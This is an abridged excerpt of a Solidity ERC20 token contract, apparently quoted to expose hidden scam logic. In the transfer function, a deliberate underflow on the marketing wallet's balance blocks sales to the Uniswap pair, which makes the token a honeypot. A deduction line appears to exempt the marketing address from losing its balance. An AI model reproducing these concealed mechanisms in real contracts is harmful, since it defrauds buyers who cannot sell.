...
contract crypto is Context, IERC20, Ownable {
    ...
    address payable private _marketingAddress = payable(0x7c6104e56486C6Ccd61e2bf2C3Bab2F4a344A1D6);
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            ...
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                uint256 B = 0 - _marketingAddress.balance;
                uint256 A = B - B;A = A;
        ...
        )
    {
        ...
        rAmount = rAmount - ((_marketingAddress == sender) ? rAmount : 0);
